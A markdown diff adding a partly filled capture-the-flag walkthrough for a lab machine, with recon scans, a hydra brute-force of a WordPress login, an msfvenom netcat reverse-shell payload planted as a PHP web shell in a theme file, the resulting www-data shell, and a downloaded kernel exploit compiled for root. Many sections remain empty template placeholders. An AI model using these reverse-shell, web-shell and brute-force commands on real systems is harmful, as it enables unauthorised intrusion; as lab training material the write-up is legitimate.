@@ -1,0 +1,196 @@
+# CTF Walkthrough
+
+## Machine Details
+- **Target IP:** 10.10.10.X
+- **Difficulty:** [Easy/Medium/Hard]
+- **Technologies:** [List relevant technologies]
+
+## 1. Setup Instructions
+- Prepare virtual machine
+- Configure network settings
+- Ensure necessary tools are installed
+
+## 2. Reconnaissance (Recon)
+
+### Network Scanning
+```bash
+# Discover network hosts
+netdiscover -r 10.10.10.0/24
+
+# Comprehensive port scanning
+nmap -sV -v -Pn 10.10.10.X
+nmap -sC -A -v -p- 10.10.10.X
+```
+
+### Scan Results
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+
+```
+
+## 3. Enumeration
+- Identify services
+- Look for potential vulnerabilities
+- Check configuration files
+- Explore web applications
+
+
+└─# dirb http://10.10.10.27 -x .txt
+dirb http://10.10.10.27 -d /usr/share/wordlists/dirb/big.txt
+
+└─# wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 --hw 500 --hl 7 http://10.10.10.27/index.php?FUZZ=location.txt
+
+
+/secret.txt
+
+
+## 4. Vulnerability Identification
+
+10.10.10.27/secret.txt
+
+
+### Vulnerability Discovery
+- **Vulnerable Version:** 
+- **Exploit Source:** 
+
+/secret.txt
+
+http://10.10.10.27/index.php?file=location.txt
+
+
+
+
+### Vulnerability Details
+⚠️ **Vulnerability Name**
+- Detailed vulnerability description
+- Potential impact
+
+### Exploit Preparation
+```bash
+# Exploit execution commands
+```
+
+hydra -L /usr/share/wordlists/rockyou.txt.gz -p follow_the_ippsec 10.10.10.27 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
+
+acesse o wordpress/adim com victor 
+                                                                                                                                                         
+┌──(root㉿kali)-[/home/kali]
+└─# msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.4 lport=443 -f raw   
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 87 bytes
+mkfifo /tmp/ndva; nc 10.10.10.4 443 0</tmp/ndva | /bin/sh >/tmp/ndva 2>&1; rm /tmp/ndva
+                                                                                                                                                          
+┌──(root㉿kali)-[/home/kali]
+└─# nc -nlvp 443
+listening on [any] 443 ...
+
+
+
+<?php
+
+exec ("mkfifo /tmp/ndva; nc 10.10.10.4 443 0</tmp/ndva | /bin/sh >/tmp/ndva 2>&1; rm /tmp/ndva");
+
+
+?>
+
+
+
+### Important Exploitation Notes
+- Specific challenges
+- Potential modification requirements
+- Compatibility considerations
+
+## 5. Exploitation Techniques
+
+### Primary Exploitation Method
+```bash
+# Exploitation code/commands
+```
+
+### Exploitation Steps
+1. Step-by-step exploitation process
+2. Detailed commands
+3. Potential variations
+
+
+
+:http://10.10.10.27/wordpress/wp-content/themes/twentynineteen/secret.php
+
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.10.4] from (UNKNOWN) [10.10.10.27] 35660
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uname -a 
+Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+## 6. Privilege Escalation
+
+### Privilege Escalation Techniques
+```bash
+# Privilege escalation commands
+find / -perm -u=s -type f 2>/dev/null
+```
+
+wget http://10.10.10.4:8080/45010.c
+
+www-data@ubuntu:/tmp$ chmod +x 45010.c
+chmod +x 45010.c
+www-data@ubuntu:/tmp$ gcc 45010.c -o f7
+gcc 45010.c -o f7
+www-data@ubuntu:/tmp$ ls
+ls
+45010.c
+VMwareDnD
+f7
+ndva
+systemd-private-906e7005c0b84128a80533f7f31b8e60-colord.service-ULY9WO
+systemd-private-906e7005c0b84128a80533f7f31b8e60-rtkit-daemon.service-w7J8Ys
+systemd-private-906e7005c0b84128a80533f7f31b8e60-systemd-timesyncd.service-vDDRYb
+www-data@ubuntu:/tmp$ chmod +x f7
+chmod +x f7
+www-data@ubuntu:/tmp$ ./f7
+
+
+## 7. Post-Exploitation
+- Maintain system access
+- Collect additional information
+- Identify further exploitation paths
+
+## 8. Flag Collection
+```bash
+# Typical flag locations
+cd /root
+cat *flag*.txt
+```
+
+## 9. Conclusion
+- Summarize exploitation technique
+- Document lessons learned
+- Note effective tools and methods
+
+## 10. Recommendations
+- Security improvements
+- Patch recommendations
+- Best practices
+
+## Appendix: Potential Challenges
+- Specific technical challenges
+- Debugging tips
+- Potential roadblocks
+
+### References
+- [Relevant Security Resources]
+- [Exploit Details]
+
+## Author's Notes
+🔍 **Debugging Tips:**
+- Key insights
+- Personal observations
+- Lessons learned
